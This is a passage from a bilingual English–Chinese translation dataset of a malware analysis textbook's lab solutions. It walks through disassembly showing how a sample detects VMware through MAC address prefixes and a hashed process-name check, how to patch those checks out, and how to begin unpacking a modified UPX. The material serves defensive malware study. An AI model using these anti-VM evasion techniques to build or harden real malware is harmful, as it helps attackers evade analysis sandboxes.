    页上“搜索易受攻击的指令”中所述。
- en: Next, we use IDA Pro to check the cross-references for the string GetAdaptersInfo.
    In Listing 17-12L, we see the string referenced at .
  id: totrans-6033
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用 IDA Pro 检查字符串 GetAdaptersInfo 的交叉引用。在清单 17-12L 中，我们看到字符串在  处被引用。
- en: 004019C9 push offset aGetadaptersinf ; "GetAdaptersInfo" 
  id: totrans-6034
  prefs: []
  type: TYPE_NORMAL
  zh: 004019C9 push offset aGetadaptersinf ; "GetAdaptersInfo" 
- en: 004019CE push offset LibFileName ; "Iphlpapi.dll"
  id: totrans-6035
  prefs: []
  type: TYPE_NORMAL
  zh: 004019CE push offset LibFileName ; "Iphlpapi.dll"
- en: 004019D3 call ds:LoadLibraryA
  id: totrans-6036
  prefs: []
  type: TYPE_NORMAL
  zh: 004019D3 call ds:LoadLibraryA
- en: 004019D9 push eax ; hModule 004019DA call ds:GetProcAddress
  id: totrans-6037
  prefs: []
  type: TYPE_NORMAL
  zh: 004019D9 push eax ; hModule 004019DA call ds:GetProcAddress
- en: 004019E0 mov GetAdaptersInfo_Address , eax
  id: totrans-6038
  prefs: []
  type: TYPE_NORMAL
  zh: 004019E0 mov GetAdaptersInfo_Address , eax
- en: '*Listing 17-12L: The dynamic resolution of GetAdaptersInfo* The malware dynamically
    resolves GetAdaptersInfo using LoadLibraryA and GetProcAddress, and loads the
    resulting address into a global variable, which we have renamed GetAdaptersInfo_Address
    at  to make it easier to recognize function calls to the runtime-loaded address
    of GetAdaptersInfo.'
  id: totrans-6039
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 17-12L：GetAdaptersInfo 的动态解析* 恶意软件使用 LoadLibraryA 和 GetProcAddress 动态解析
    GetAdaptersInfo，并将结果地址加载到全局变量中，我们将该变量重命名为 GetAdaptersInfo_Address 以便更容易识别对 GetAdaptersInfo
    运行时加载地址的函数调用。'
- en: Checking the cross-references to GetAdaptersInfo_Address, we see it called in
    two places within the function sub_401670\. At a high level, this function appears
    similar to a function we examined in Lab 12-2 that loaded the resource section
    containing the keylogger. However, the function in this lab appears to have a
    bunch of code added to the start. Let’s examine that code.
  id: totrans-6040
  prefs: []
  type: TYPE_NORMAL
  zh: 检查 GetAdaptersInfo_Address 的交叉引用，我们看到它在函数 sub_401670 的两个地方被调用。从高层次来看，这个函数看起来与我们在
    Lab 12-2 中检查的包含键盘记录器的资源部分加载的函数类似。然而，这个实验室中的函数似乎在开头添加了一大堆代码。让我们检查一下这段代码。
- en: Listing 17-13L shows the start of a series of byte moves at . This byte array
    initialization can be converted to a byte array by double-clicking var_38
  id: totrans-6041
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 17-13L 显示了一系列字节移动的起始点 。通过双击 var_38，可以将这个字节数组初始化转换为字节数组。
- en: and setting it to an array of size 27\. We rename the array to Byte_Array to
    aid our analysis later on.
  id: totrans-6042
  prefs: []
  type: TYPE_NORMAL
  zh: 并将其设置为大小为 27 的数组。我们将该数组重命名为 Byte_Array 以便我们在后续分析中更容易识别。
- en: '**680**'
  id: totrans-6043
  prefs: []
  type: TYPE_NORMAL
  zh: '**680**'
- en: Appendix C
  id: totrans-6044
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6045
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004016A8 mov [ebp+var_38], 0 
  id: totrans-6046
  prefs: []
  type: TYPE_NORMAL
  zh: 004016A8 mov [ebp+var_38], 0 
- en: 004016AC mov [ebp+var_37], 50h
  id: totrans-6047
  prefs: []
  type: TYPE_NORMAL
  zh: 004016AC mov [ebp+var_37], 50h
- en: 004016B0 mov [ebp+var_36], 56h
  id: totrans-6048
  prefs: []
  type: TYPE_NORMAL
  zh: 004016B0 mov [ebp+var_36], 56h
- en: 004016B4 mov [ebp+var_35], 0
  id: totrans-6049
  prefs: []
  type: TYPE_NORMAL
  zh: 004016B4 mov [ebp+var_35], 0
- en: 004016B8 mov [ebp+var_34], 0Ch
  id: totrans-6050
  prefs: []
  type: TYPE_NORMAL
  zh: 004016B8 mov [ebp+var_34], 0Ch
- en: 004016BC mov [ebp+var_33], 29h
  id: totrans-6051
  prefs: []
  type: TYPE_NORMAL
  zh: 004016BC mov [ebp+var_33], 29h
- en: '...'
  id: totrans-6052
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040170C mov [ebp+var_1F], 0
  id: totrans-6053
  prefs: []
  type: TYPE_NORMAL
  zh: 0040170C mov [ebp+var_1F], 0
- en: 00401710 mov [ebp+var_1E], 27h
  id: totrans-6054
  prefs: []
  type: TYPE_NORMAL
  zh: 00401710 mov [ebp+var_1E], 27h
- en: 00401714 mov [ebp+dwBytes], 0
  id: totrans-6055
  prefs: []
  type: TYPE_NORMAL
  zh: 00401714 mov [ebp+dwBytes], 0
- en: 0040171B lea eax, [ebp+dwBytes]
  id: totrans-6056
  prefs: []
  type: TYPE_NORMAL
  zh: 0040171B lea eax, [ebp+dwBytes]
- en: 0040171E push eax
  id: totrans-6057
  prefs: []
  type: TYPE_NORMAL
  zh: 0040171E push eax
- en: 0040171F push 0
  id: totrans-6058
  prefs: []
  type: TYPE_NORMAL
  zh: 0040171F push 0
- en: 00401721 call GetAdaptersInfo_Address 
  id: totrans-6059
  prefs: []
  type: TYPE_NORMAL
  zh: 00401721 call GetAdaptersInfo_Address 
- en: '*Listing 17-13L: Byte array initialization and first call to GetAdaptersInfo_Address*
    The call to GetAdaptersInfo_Address at  in Listing 17-13L takes two parameters:
    a linked list of IP_ADAPTER_INFO structures and the size of that linked list.
    Here, the linked list passed in is NULL, and the size will be returned in dwBytes.
    Calling GetAdaptersInfo_Address with the first parameter set to NULL is an easy
    way to figure out how much data it returns in order to allocate memory for the
    linked list structure to be used in a second call to GetAdaptersInfo_Address.
    This is the reason the malware uses dwBytes in subsequent calls to GetProcessHeap
    and HeapAlloc.'
  id: totrans-6060
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-13L：字节数组初始化和第一次调用 GetAdaptersInfo_Address* 列表 17-13L 中在处对 GetAdaptersInfo_Address
    的调用接受两个参数：一个 IP_ADAPTER_INFO 结构的链表及其大小。在这里，传入的链表是 NULL，大小将在 dwBytes 中返回。将第一个参数设置为
    NULL 来调用 GetAdaptersInfo_Address 是一种简单的方法，可以找出它返回多少数据，以便为第二次调用 GetAdaptersInfo_Address
    中使用的链表结构分配内存。这就是恶意软件在后续调用 GetProcessHeap 和 HeapAlloc 时使用 dwBytes 的原因。'
- en: Listing 17-14L shows that the malware uses HeapAlloc at  and calls GetAdaptersInfo_Address
    a second time at .
  id: totrans-6061
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 17-14L 显示恶意软件在处使用 HeapAlloc，并在处第二次调用 GetAdaptersInfo_Address。
- en: 0040174B call ds:HeapAlloc 
  id: totrans-6062
  prefs: []
  type: TYPE_NORMAL
  zh: 0040174B call ds:HeapAlloc 
- en: 00401751 mov [ebp+lpMem], eax 
  id: totrans-6063
  prefs: []
  type: TYPE_NORMAL
  zh: 00401751 mov [ebp+lpMem], eax 
- en: 00401754 cmp [ebp+lpMem], 0
  id: totrans-6064
  prefs: []
  type: TYPE_NORMAL
  zh: 00401754 cmp [ebp+lpMem]，0
- en: '...'
  id: totrans-6065
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 00401766 lea edx, [ebp+dwBytes]
  id: totrans-6066
  prefs: []
  type: TYPE_NORMAL
  zh: 00401766 lea edx, [ebp+dwBytes]
- en: 00401769 push edx
  id: totrans-6067
  prefs: []
  type: TYPE_NORMAL
  zh: 00401769 push edx
- en: 0040176A mov eax, [ebp+lpMem]
  id: totrans-6068
  prefs: []
  type: TYPE_NORMAL
  zh: 0040176A mov eax, [ebp+lpMem]
- en: 0040176D push eax
  id: totrans-6069
  prefs: []
  type: TYPE_NORMAL
  zh: 0040176D push eax
- en: 0040176E call GetAdaptersInfo_Address 
  id: totrans-6070
  prefs: []
  type: TYPE_NORMAL
  zh: 0040176E call GetAdaptersInfo_Address 
- en: '*Listing 17-14L: Second call to GetAdaptersInfo_Address, which populates the
    results* **1 7**'
  id: totrans-6071
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-14L：第二次调用 GetAdaptersInfo_Address，填充结果* **1 7**'
- en: The parameter labeled lpMem by IDA Pro is the return value from HeapAlloc, as
    seen at . This parameter is passed to the second call of GetAdaptersInfo_Address
    at  instead of NULL. After the call to GetAdaptersInfo_Address, the lpMem parameter
    is a pointer to a linked list of IP_ADAPTER_INFO structures with a size of dwBytes.
  id: totrans-6072
  prefs: []
  type: TYPE_NORMAL
  zh: IDA Pro 标记为 lpMem 的参数是 HeapAlloc 的返回值，如处所示。此参数传递给处的第二次 GetAdaptersInfo_Address
    调用，而不是 NULL。在调用 GetAdaptersInfo_Address 之后，lpMem 参数是指向 IP_ADAPTER_INFO 结构链表的指针，大小为
    dwBytes。
- en: We must add the IP_ADAPTER_INFO structure to IDA Pro since it failed to recognize
    and label things fully. To do so, press the INSERTkey within the Structures window
    and add the standard structure IP_ADAPTER_INFO. Now apply the structure to data
    in our disassembly as shown in Table 17-1L at ,
  id: totrans-6073
  prefs: []
  type: TYPE_NORMAL
  zh: 我们必须在 IDA Pro 中添加 IP_ADAPTER_INFO 结构，因为它未能完全识别和标记这些内容。要做到这一点，请在结构窗口中按 INSERT
    键，并添加标准结构 IP_ADAPTER_INFO。现在将结构应用于我们的反汇编数据，如表 17-1L 中的所示，
- en: , and .
  id: totrans-6074
  prefs: []
  type: TYPE_NORMAL
  zh: ，和 。
- en: Solutions to Labs
  id: totrans-6075
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**681**'
  id: totrans-6076
  prefs: []
  type: TYPE_NORMAL
  zh: '**681**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6077
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Table 17-1L:** Before and After Applying Structure Information and Standard
    Constants **Before**'
  id: totrans-6078
  prefs: []
  type: TYPE_NORMAL
  zh: '**表 17-1L：应用结构信息和标准常量之前和之后** **之前**'
- en: '**After**'
  id: totrans-6079
  prefs: []
  type: TYPE_NORMAL
  zh: '**之后**'
- en: mov edx, [ebp+lpMem]
  id: totrans-6080
  prefs: []
  type: TYPE_NORMAL
  zh: mov edx, [ebp+lpMem]
- en: mov edx, [ebp+lpMem]
  id: totrans-6081
  prefs: []
  type: TYPE_NORMAL
  zh: mov edx, [ebp+lpMem]
- en: cmp dword ptr [edx+1A0h], 6
  id: totrans-6082
  prefs: []
  type: TYPE_NORMAL
  zh: cmp dword ptr [edx+1A0h]，6
- en: cmp [edx+**IP_ADAPTER_INFO.Type**], MIB_IF_TYPE_ETHERNET
  id: totrans-6083
  prefs: []
  type: TYPE_NORMAL
  zh: cmp [edx+**IP_ADAPTER_INFO.Type**]，MIB_IF_TYPE_ETHERNET
- en: jz short loc_4017B9
  id: totrans-6084
  prefs: []
  type: TYPE_NORMAL
  zh: jz short loc_4017B9
- en: jz short loc_4017B9
  id: totrans-6085
  prefs: []
  type: TYPE_NORMAL
  zh: jz short loc_4017B9
- en: mov eax, [ebp+lpMem]
  id: totrans-6086
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, [ebp+lpMem]
- en: mov eax, [ebp+lpMem]
  id: totrans-6087
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, [ebp+lpMem]
- en: cmp dword ptr [eax+1A0h], 71h
  id: totrans-6088
  prefs: []
  type: TYPE_NORMAL
  zh: cmp dword ptr [eax+1A0h]，71h
- en: cmp [eax+**IP_ADAPTER_INFO.Type**], IF_TYPE_IEEE80211
  id: totrans-6089
  prefs: []
  type: TYPE_NORMAL
  zh: cmp [eax+**IP_ADAPTER_INFO.Type**]，IF_TYPE_IEEE80211
- en: jnz short loc_401816
  id: totrans-6090
  prefs: []
  type: TYPE_NORMAL
  zh: jnz short loc_401816
- en: jnz short loc_401816
  id: totrans-6091
  prefs: []
  type: TYPE_NORMAL
  zh: jnz short loc_401816
- en: mov ecx, [ebp+lpMem]
  id: totrans-6092
  prefs: []
  type: TYPE_NORMAL
  zh: mov ecx, [ebp+lpMem]
- en: mov ecx, [ebp+lpMem]
  id: totrans-6093
  prefs: []
  type: TYPE_NORMAL
  zh: mov ecx, [ebp+lpMem]
- en: cmp dword ptr [ecx+190h], 2
  id: totrans-6094
  prefs: []
  type: TYPE_NORMAL
  zh: cmp dword ptr [ecx+190h]，2
- en: cmp [ecx+**IP_ADAPTER_INFO.AddressLength**], 2
  id: totrans-6095
  prefs: []
  type: TYPE_NORMAL
  zh: cmp [ecx+**IP_ADAPTER_INFO.AddressLength**]，2
- en: jbe short loc_401816
  id: totrans-6096
  prefs: []
  type: TYPE_NORMAL
  zh: jbe short loc_401816
- en: jbe short loc_401816
  id: totrans-6097
  prefs: []
  type: TYPE_NORMAL
  zh: jbe short loc_401816
- en: The left side of Table 17-1L shows the code listing before we apply the IP_ADAPTER_INFO
    structure offsets and standard constants to the data. To apply the structure,
    right-click the locations , , and , and you will be given the option to turn
    numbers into the descriptive strings shown in bold in the right side of the table.
    Using the MSDN page for IP_ADAPTER_INFO as reference, we learn about the standard
    constants for Type and see that 0x6 and 0x71 correspond to an adapter type of
    Ethernet or 802.11 wireless (so the address will be a MAC address).
  id: totrans-6098
  prefs: []
  type: TYPE_NORMAL
  zh: 表 17-1L 的左侧显示了在将 IP_ADAPTER_INFO 结构偏移和标准常量应用于数据之前，代码列表的情况。要应用结构，右键单击位置、和，您将获得将数字转换为表右侧以粗体显示的描述性字符串的选项。以
    IP_ADAPTER_INFO 的 MSDN 页面为参考，我们了解了类型的标准常量，并看到 0x6 和 0x71 对应于以太网或 802.11 无线适配器类型（因此地址将是
    MAC 地址）。
- en: In the three comparisons shown in Table 17-1L, the malware is checking for Ethernet
    or wireless interfaces, and then confirming that the adapter address length is
    greater than 2\. If this check fails, the malware loops to the next adapter in
    the linked list. If the check succeeds, the code shown in Listing 17-15L will
    execute.
  id: totrans-6099
  prefs: []
  type: TYPE_NORMAL
  zh: 在表 17-1L 中显示的三个比较中，恶意软件正在检查以太网或无线接口，并确认适配器地址长度大于 2。如果此检查失败，恶意软件将循环到链表中的下一个适配器。如果检查成功，将执行列出
    17-15L 中的代码。
- en: 004017CC jmp short loc_4017D7
  id: totrans-6100
  prefs: []
  type: TYPE_NORMAL
  zh: 004017CC jmp short loc_4017D7
- en: 004017CE mov edx, [ebp+var_3C]
  id: totrans-6101
  prefs: []
  type: TYPE_NORMAL
  zh: 004017CE mov edx, [ebp+var_3C]
- en: 004017D1 add edx, 3 
  id: totrans-6102
  prefs: []
  type: TYPE_NORMAL
  zh: 004017D1 add edx, 3 
- en: 004017D4 mov [ebp+var_3C], edx
  id: totrans-6103
  prefs: []
  type: TYPE_NORMAL
  zh: 004017D4 mov [ebp+var_3C], edx
- en: '...'
  id: totrans-6104
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 004017DD mov ecx, 3 
  id: totrans-6105
  prefs: []
  type: TYPE_NORMAL
  zh: 004017DD mov ecx, 3 
- en: 004017E2 mov eax, [ebp+var_3C]
  id: totrans-6106
  prefs: []
  type: TYPE_NORMAL
  zh: 004017E2 mov eax, [ebp+var_3C]
- en: 004017E5 lea edi, [ebp+eax+Byte_Array] 
  id: totrans-6107
  prefs: []
  type: TYPE_NORMAL
  zh: 004017E5 lea edi, [ebp+eax+Byte_Array] 
- en: 004017E9 mov esi, [ebp+lpMem]
  id: totrans-6108
  prefs: []
  type: TYPE_NORMAL
  zh: 004017E9 mov esi, [ebp+lpMem]
- en: 004017EC add esi, 194h 
  id: totrans-6109
  prefs: []
  type: TYPE_NORMAL
  zh: 004017EC add esi, 194h 
- en: 004017F2 xor edx, edx
  id: totrans-6110
  prefs: []
  type: TYPE_NORMAL
  zh: 004017F2 xor edx, edx
- en: 004017F4 repe cmpsb
  id: totrans-6111
  prefs: []
  type: TYPE_NORMAL
  zh: 004017F4 repe cmpsb
- en: 004017F6 jnz short loc_401814
  id: totrans-6112
  prefs: []
  type: TYPE_NORMAL
  zh: 004017F6 jnz short loc_401814
- en: '*Listing 17-15L: Comparing the adapter address to Byte_Array* To make this
    code more readable, right-click the 194h at  and change it to IP_ADAPTER_INFO.Address.'
  id: totrans-6113
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 17-15L：比较适配器地址与 Byte_Array* 为了使此代码更易读，右键单击处的 194h 并将其更改为 IP_ADAPTER_INFO.Address。'
- en: The code is comparing the currently referenced IP_ADAPTER_INFO’s address to
    an index in Byte_Array. Byte_Array is indexed at  using EAX, which is filled
    with var_3C, a loop counter that we see incremented by 3 at . The repe cmpsb
    instruction compares Byte_Array to the IP_ADAPTER_INFO.Address for 3 bytes (because
    ECX is set to 3 at ), which means it is checking to see if the first 3 bytes
    of the MAC address are {00h,50h,56h} or {00h,0Ch,29h} and so on. An **682**
  id: totrans-6114
  prefs: []
  type: TYPE_NORMAL
  zh: 代码正在比较当前引用的 IP_ADAPTER_INFO 的地址与 Byte_Array 中的索引。Byte_Array 使用 EAX 索引，EAX 被填充为
    var_3C，这是一个我们在处看到的递增 3 的循环计数器。repe cmpsb 指令比较 Byte_Array 和 IP_ADAPTER_INFO.Address
    的 3 个字节（因为 ECX 在处被设置为 3），这意味着它正在检查 MAC 地址的前 3 个字节是否为 {00h,50h,56h} 或 {00h,0Ch,29h}
    等等。**682**
- en: Appendix C
  id: totrans-6115
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6116
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Internet search for “00,0C,29” tells us that it is a common start of the default
    MAC address for VMware. Since the array is of size 27, we know that this code
    compares nine different MAC addresses (most associated with VMware).
  id: totrans-6117
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Internet 上搜索“00,0C,29”告诉我们，这是 VMware 默认 MAC 地址的常见起始地址。由于数组大小为 27，我们知道此代码比较了九个不同的
    MAC 地址（大多数与 VMware 相关）。
- en: We permanently disable this check by avoiding the MAC address comparisons altogether.
    Modify the jnz instruction at 0x40169F to be jmp 0x40184A using OllyDbg’s Assemble
    functionality, as we did earlier to force the malware to skip the adapter checks
    and go straight to the resource section manipulation code.
  id: totrans-6118
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过完全避免 MAC 地址比较来永久禁用此检查。使用 OllyDbg 的汇编功能将 0x40169F 处的 jnz 指令修改为 jmp 0x40184A，就像我们之前强制恶意软件跳过适配器检查并直接转到资源部分操作代码一样。
- en: '**Reviewing the Final Check**'
  id: totrans-6119
  prefs: []
  type: TYPE_NORMAL
  zh: '**审查最终检查**'
- en: The final anti-VM check in this malware is in sub_401400, which performs process
    replacement. The code in Listing 17-16L shows a call at , which determines if
    the jz at  will be taken. If the jump is not taken, the code will terminate without
    performing the process replacement.
  id: totrans-6120
  prefs: []
  type: TYPE_NORMAL
  zh: 此恶意软件中的最后一个反 VM 检查在 sub_401400 中，它执行进程替换。列出 17-16L 中的代码显示了处的调用，该调用确定是否将执行处的
    jz。如果跳转未执行，则代码将终止而不会执行进程替换。
- en: 00401448 xor eax, eax 
  id: totrans-6121
  prefs: []
  type: TYPE_NORMAL
  zh: 00401448 xor eax, eax 
- en: '...'
  id: totrans-6122
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 00401456 push 6
  id: totrans-6123
  prefs: []
  type: TYPE_NORMAL
  zh: 00401456 push 6
- en: 00401458 push 0F30D12A5h
  id: totrans-6124
  prefs: []
  type: TYPE_NORMAL
  zh: 00401458 push 0F30D12A5h
- en: 0040145D call sub_401130 
  id: totrans-6125
  prefs: []
  type: TYPE_NORMAL
  zh: 0040145D call sub_401130 
- en: 00401462 add esp, 8
  id: totrans-6126
  prefs: []
  type: TYPE_NORMAL
  zh: 00401462 add esp, 8
- en: 00401465 test eax, eax
  id: totrans-6127
  prefs: []
  type: TYPE_NORMAL
  zh: 00401465 test eax, eax
- en: 00401467 jz short loc_401470 
  id: totrans-6128
  prefs: []
  type: TYPE_NORMAL
  zh: 00401467 jz short loc_401470 
- en: '*Listing 17-16L: Final anti-VM check*'
  id: totrans-6129
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 17-16L：最终反 VM 检查*'
- en: 'As shown in Listing 17-16L, the anti-VM function sub_401130 takes two parameters:
    6 and the integer 0xF30D12A5\. This function loops through the process listing
    by calling CreateToolhelp32Snapshot, Process32First, and Process32Next. Process32Next
    is inside a loop with the code shown in Listing 17-17L.'
  id: totrans-6130
  prefs: []
  type: TYPE_NORMAL
  zh: 如列出 17-16L 所示，反 VM 函数 sub_401130 接受两个参数：6 和整数 0xF30D12A5。此函数通过调用 CreateToolhelp32Snapshot、Process32First
    和 Process32Next 遍历进程列表。Process32Next 在列出 17-17L 中的代码所示的循环中。
- en: 0040116D mov edx, [ebp+arg_4]
  id: totrans-6131
  prefs: []
  type: TYPE_NORMAL
  zh: 0040116D mov edx, [ebp+arg_4]
- en: 00401170 push edx
  id: totrans-6132
  prefs: []
  type: TYPE_NORMAL
  zh: 00401170 push edx
- en: 00401171 lea eax, [ebp+pe.szExeFile]
  id: totrans-6133
  prefs: []
  type: TYPE_NORMAL
  zh: 00401171 lea eax, [ebp+pe.szExeFile]
- en: 00401177 push eax
  id: totrans-6134
  prefs: []
  type: TYPE_NORMAL
  zh: 00401177 push eax
- en: 00401178 call sub_401060  ; make lowercase
  id: totrans-6135
  prefs: []
  type: TYPE_NORMAL
  zh: 00401178 call sub_401060  ; 转换为小写
- en: 0040117D add esp, 4
  id: totrans-6136
  prefs: []
  type: TYPE_NORMAL
  zh: 0040117D add esp, 4
- en: '**1 7**'
  id: totrans-6137
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 7**'
- en: 00401180 push eax
  id: totrans-6138
  prefs: []
  type: TYPE_NORMAL
  zh: 00401180 push eax
- en: 00401181 call sub_401000  ; get string hash 00401186 add esp, 8
  id: totrans-6139
  prefs: []
  type: TYPE_NORMAL
  zh: 00401181 call sub_401000  ; 获取字符串哈希 00401186 add esp, 8
- en: 00401189 mov [ebp+var_130], eax
  id: totrans-6140
  prefs: []
  type: TYPE_NORMAL
  zh: 00401189 mov [ebp+var_130], eax
- en: 0040118F mov ecx, [ebp+var_130]
  id: totrans-6141
  prefs: []
  type: TYPE_NORMAL
  zh: 0040118F mov ecx, [ebp+var_130]
- en: 00401195 cmp ecx, [ebp+arg_0] 
  id: totrans-6142
  prefs: []
  type: TYPE_NORMAL
  zh: 00401195 cmp ecx, [ebp+arg_0] 
- en: '*Listing 17-17L: Code for comparing a process name string* The function sub_401060
    called at  takes a single parameter containing the name of the process and sets
    all of the parameter’s characters to lowercase. The function sub_401000 called
    at  takes two parameters: 6 (arg_4) and the lowercase string returned from sub_401060\.
    The result of this function is Solutions to Labs'
  id: totrans-6143
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-17L：比较进程名称字符串的代码* 在  处调用的函数 sub_401060 接收一个包含进程名称的单个参数，并将参数的所有字符设置为小写。在
     处调用的函数 sub_401000 接收两个参数：6 (arg_4) 和从 sub_401060 返回的小写字符串。此函数的结果是实验室解答。'
- en: '**683**'
  id: totrans-6144
  prefs: []
  type: TYPE_NORMAL
  zh: '**683**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6145
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: compared to the 0xF30D12A5 (arg_0) at . If the result is equal to 0xF30D12A5,
    the function will return 1, which will cause the malware to terminate. In other
    words, sub_401000 is taking the process name and turning it into a number, and
    then seeing if that number is equal to a preset value. sub_401000 is a simple
    string-hashing function. Given the parameter "vmware", it returns 0xF30D12A5\.
    The malware is cleverly using a string hash to avoid using the string vmware in
    the comparison, which would have made easy pickings for the malware analyst.
  id: totrans-6146
  prefs: []
  type: TYPE_NORMAL
  zh: 与  中的 0xF30D12A5 (arg_0) 进行比较。如果结果等于 0xF30D12A5，函数将返回 1，这将导致恶意软件终止。换句话说，sub_401000
    正在将进程名称转换为数字，然后检查该数字是否等于预设值。sub_401000 是一个简单的字符串哈希函数。给定参数 "vmware"，它返回 0xF30D12A5。恶意软件巧妙地使用字符串哈希来避免在比较中使用字符串
    vmware，这会使恶意软件分析员容易识别。
- en: To permanently disable this final anti-VM check, we can NOP-out the call to
    sub_401130 at 0x40145D. This forces the malware to skip the check and go straight
    to the process-replacement code because the xor at  in Listing 17-16L ensures
    that the EAX register will be 0\.
  id: totrans-6147
  prefs: []
  type: TYPE_NORMAL
  zh: 要永久禁用此最后的反 VM 检查，我们可以在 0x40145D 处将 sub_401130 的调用 NOP-out。这迫使恶意软件跳过检查并直接进入进程替换代码，因为列表
    17-16L 中的 xor 在  确保了 EAX 寄存器将为 0。
- en: '**Summary**'
  id: totrans-6148
  prefs: []
  type: TYPE_NORMAL
  zh: '**摘要**'
- en: 'This malware performs four different checks for VMware. Three of these check
    for system residue, and the other queries the I/O communication port. The system
    residue checking techniques include the following:'
  id: totrans-6149
  prefs: []
  type: TYPE_NORMAL
  zh: 此恶意软件对 VMware 执行了四种不同的检查。其中三种检查系统残留物，另一种查询 I/O 通信端口。系统残留物检查技术包括以下内容：
- en: 
  id: totrans-6150
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Check the first 3 bytes of the MAC address for known values associated with
    virtual machines.
  id: totrans-6151
  prefs: []
  type: TYPE_NORMAL
  zh: 检查 MAC 地址的前 3 个字节，以查找与虚拟机相关的已知值。
- en: 
  id: totrans-6152
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Check the registry for the key vmware under the registry path SYSTEM\ CurrentControlSet\Control\DeviceClasses.
  id: totrans-6153
  prefs: []
  type: TYPE_NORMAL
  zh: 在注册表中检查 SYSTEM\ CurrentControlSet\Control\DeviceClasses 路径下的 vmware 键。
- en: 
  id: totrans-6154
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Check the process listing for processes beginning with the string vmware in
    any combination of uppercase and lowercase letters.
  id: totrans-6155
  prefs: []
  type: TYPE_NORMAL
  zh: 检查进程列表，查找以字符串 vmware 开头的进程，无论大小写如何的组合。
- en: '**Lab 18-1 Solutions**'
  id: totrans-6156
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 18-1 解答**'
- en: '*Lab18-01.exe* is Lab 14-1 packed with a slightly modified version of UPX,
    one of the most popular packers encountered in the wild. The modifications to
    UPX make it more resistant to signature detection. When you run PEiD on the packed
    executable, it does not detect the packer. However, a section in the file named
    UPX2 should make you suspect that a UPX-like packer is being used. Running UPX
    –d on the packed file fails because of the modifications made to the packer.'
  id: totrans-6157
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab18-01.exe* 是用稍作修改的 UPX 版本打包的 Lab 14-1，UPX 是在野外遇到的最流行的打包器之一。对 UPX 的修改使其对签名检测更具抵抗力。当你对打包的可执行文件运行
    PEiD 时，它不会检测到打包器。然而，文件中名为 UPX2 的部分应该让你怀疑正在使用类似 UPX 的打包器。由于对打包器所做的修改，运行 UPX –d
    在打包文件上失败。'
- en: We first try to unpack the program manually by loading the program in OllyDbg
    to find the OEP. First, we simply page down through the code to see if the tail
    jump is obvious. As you can see in Listing 18-1L, it is.
  id: totrans-6158
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先尝试手动解包程序，通过在 OllyDbg 中加载程序来找到 OEP。首先，我们简单地向下滚动代码以查看尾部跳转是否明显。如列表 18-1L 所示，它是明显的。
- en: 00409F32 CALL EBP
  id: totrans-6159
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F32 CALL EBP
- en: 00409F34 POP EAX
  id: totrans-6160
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F34 POP EAX
- en: 00409F35 POPAD
  id: totrans-6161
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F35 POPAD
- en: 00409F36 LEA EAX,DWORD PTR SS:[ESP-80]
  id: totrans-6162
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F36 LEA EAX,DWORD PTR SS:[ESP-80]
- en: 00409F3A PUSH 0
  id: totrans-6163
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F3A PUSH 0
- en: 00409F3C CMP ESP,EAX
  id: totrans-6164
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F3C CMP ESP,EAX
- en: 00409F3E JNZ SHORT Lab14-1.00409F3A
  id: totrans-6165
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F3E JNZ SHORT Lab14-1.00409F3A
- en: 00409F40 SUB ESP,-80
  id: totrans-6166
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F40 SUB ESP,-80
- en: 00409F43 JMP Lab14-1.0040154F
  id: totrans-6167
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F43 JMP Lab14-1.0040154F
- en: 00409F48 DB 00
  id: totrans-6168
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F48 DB 00
- en: '**684**'
  id: totrans-6169
  prefs: []
  type: TYPE_NORMAL
  zh: '**684**'
- en: Appendix C
  id: totrans-6170
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6171
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
